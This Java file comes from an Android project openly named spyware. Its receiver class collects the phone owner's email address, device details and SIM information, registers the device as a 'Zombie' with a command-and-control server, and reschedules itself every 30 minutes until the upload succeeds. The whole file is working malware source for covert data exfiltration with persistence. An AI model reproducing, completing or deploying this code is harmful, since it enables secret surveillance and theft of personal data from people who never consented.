package android.spyware;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Log;

import java.util.Calendar;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;
import static android.spyware.Spyware.TIMER;

/**
 * This broadcast receiver sends the Zombie to the CC.
 */
public class SendZombieR extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        Harvester harvester = new Harvester(context);

        if (harvester.isNetworkConnected()) {
            Log.i(TAG, "::INF  Sending Zombie...");

            if (harvester.getEmail() != null && harvester.getDevice() != null && harvester.getSim() != null) {
                Zombie zombie = new Zombie(harvester.getEmail(), harvester.getDevice(),
                        harvester.getSim());
                Param mParams = new Param("Zombie", zombie.toJSON());
                AsyncTask<Param, Void, Integer> PostJSONArray = new PostDataAT();

                try {
                    PostJSONArray.execute(mParams);

                    if (PostJSONArray.get().equals(200)) {
                        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(context);
                        prefs.edit().putBoolean("SendZombieR", true).apply();
                        if (DEV_MODE)
                            Log.i(TAG, "::INF  SendZombie.onReceive: SharedPreferences updated.");
                    } else
                        setAlarm(context);
                } catch (Exception e) {
                    Log.wtf(TAG, "::ERR   " + Log.getStackTraceString(e));
                    setAlarm(context);
                }
            } else {
                Log.wtf(TAG, "::ERR  SendZombieR.onReceive(): The required information could not be extracted.");
                setAlarm(context);
            }
        } else {
            Log.wtf(TAG, "::ERR  SendZombieR.onReceive(): No internet connectivity.");
            setAlarm(context);
        }
    }

    // Set the alarm to trigger the BroadcastReceiver in 30 minutes.
    private void setAlarm(Context context) {
        Calendar nextAlarm = Calendar.getInstance();
        nextAlarm.add(Calendar.MINUTE, TIMER);

        Intent intent = new Intent(context, SendZombieR.class);
        PendingIntent pIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.RTC_WAKEUP, nextAlarm.getTimeInMillis(), pIntent);

        if (DEV_MODE) {
            Log.i(TAG, "::INF  SendZombie alarm set for: " + nextAlarm.get(Calendar.HOUR) + ":"
                    + nextAlarm.get(Calendar.MINUTE) + ":" + nextAlarm.get(Calendar.SECOND));
        }
    }
}
